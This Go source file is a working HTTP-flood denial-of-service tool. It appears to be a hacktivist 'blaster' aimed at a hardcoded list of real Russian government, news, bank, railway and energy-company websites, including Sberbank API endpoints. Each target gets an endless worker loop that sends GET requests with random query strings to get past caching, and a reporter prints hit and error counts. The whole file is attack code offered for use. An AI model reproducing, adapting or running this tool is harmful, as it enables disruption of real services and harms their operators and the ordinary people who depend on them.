/* This will be ugly */

package blaster

import (
	"fmt"
	"math/rand"
	"net/http"
	"sync"
	"time"
)

var (
	TARGETS = []string{
		"https://lenta.ru/",
		"https://ria.ru/",
		"https://ria.ru/lenta/",
		"https://www.rbc.ru/",
		"https://www.rt.com/",
		"http://kremlin.ru/",
		"http://en.kremlin.ru/",
		"https://smotrim.ru/",
		"https://tass.ru/",
		"https://tvzvezda.ru/",
		"https://vsoloviev.ru/",
		"https://www.1tv.ru/",
		"https://www.vesti.ru/",
		"https://online.sberbank.ru/",
		"https://sberbank.ru/",
		"https://zakupki.gov.ru/",
		"https://www.gosuslugi.ru/",
		"https://er.ru/",
		"https://www.rzd.ru/",
		"https://rzdlog.ru/",
		"https://vgtrk.ru/",
		"https://www.interfax.ru/",
		"https://www.mos.ru/uslugi/",
		"http://government.ru/",
		"https://mil.ru/",
		"https://www.nalog.gov.ru/",
		"https://customs.gov.ru/",
		"https://pfr.gov.ru/",
		"https://rkn.gov.ru/",
		"https://www.gazprombank.ru/",
		"https://www.vtb.ru/",
		"https://www.gazprom.ru/",
		"https://lukoil.ru",
		"https://magnit.ru/",
		"https://www.nornickel.com/",
		"https://www.surgutneftegas.ru/",
		"https://www.tatneft.ru/",
		"https://www.evraz.com/ru/",
		"https://nlmk.com/",
		"https://www.sibur.ru/",
		"https://www.severstal.com/",
		"https://www.metalloinvest.com/",
		"https://nangs.org/",
		"https://rmk-group.ru/ru/",
		"https://www.tmk-group.ru/",
		"https://ya.ru/",
		"https://www.polymetalinternational.com/ru/",
		"https://www.uralkali.com/ru/",
		"https://www.eurosib.ru/",
		"https://omk.ru/",
		"https://mail.rkn.gov.ru/",
		"https://cloud.rkn.gov.ru/",
		"https://mvd.gov.ru/",
		"https://pwd.wto.economy.gov.ru/",
		"https://stroi.gov.ru/",
		"https://proverki.gov.ru/",
		"https://www.gazeta.ru/",
		"https://www.crimea.kp.ru/",
		"https://www.kommersant.ru/",
		"https://riafan.ru/",
		"https://www.mk.ru/",
		"https://api.sberbank.ru/prod/tokens/v2/oauth",
		"https://api.sberbank.ru/prod/tokens/v2/oidc",
	}
)

func New() *Blaster {
	return &Blaster{statsChan: make(chan StatItem, 10000), stats: map[string]StatEntry{}}
}

type Blaster struct {
	statsLock sync.RWMutex
	stats     map[string]StatEntry
	statsChan chan StatItem
}

func (b *Blaster) Run() {
	go b.StatsCollector()
	go b.StatsReporter()
	for _, uri := range TARGETS {
		worker := NewWorker(uri, b.statsChan)
		go worker.Run()
	}
}

func (b *Blaster) StatsReporter() {
	for {
		b.statsLock.RLock()
		for key, val := range b.stats {
			fmt.Printf("Url: %s Hits: %d Errors: %d\n", key, val.Hits, val.Errors)
		}
		b.statsLock.RUnlock()
		fmt.Println("----------------------------")
		time.Sleep(30 * time.Second)
	}
}

func (b *Blaster) StatsCollector() {
	for {
		entry := <-b.statsChan
		b.statsLock.Lock()
		val, ok := b.stats[entry.Uri]
		if ok {

			if entry.Error {
				val.Errors += 1
			}

			if entry.Hit {
				val.Hits += 1
			}

			b.stats[entry.Uri] = val

		} else {

			newVal := StatEntry{}

			if entry.Error {
				newVal.Errors += 1
			}

			if entry.Hit {
				newVal.Hits += 1
			}

			b.stats[entry.Uri] = newVal

		}
		b.statsLock.Unlock()
	}
}

type Worker struct {
	uri   string
	stats chan StatItem
}

func NewWorker(uri string, statsChan chan StatItem) *Worker {
	return &Worker{uri: uri, stats: statsChan}
}

func (w *Worker) Run() {
	for {
		targetUrl := fmt.Sprintf("%s?%d", w.uri, rand.Intn(10000000000000))
		client := http.Client{
			Timeout: 1 * time.Second,
		}
		resp, err := client.Get(targetUrl)
		if err != nil {
			// handle error, add to stats ?
			w.stats <- StatItem{Uri: w.uri, Error: true, Hit: true}
			continue
		}
		defer resp.Body.Close()
		// add to stats ?
		w.stats <- StatItem{Uri: w.uri, Error: false, Hit: true}
	}
}

type StatEntry struct {
	Hits   int
	Errors int
}

type StatItem struct {
	Uri   string
	Hit   bool
	Error bool
}
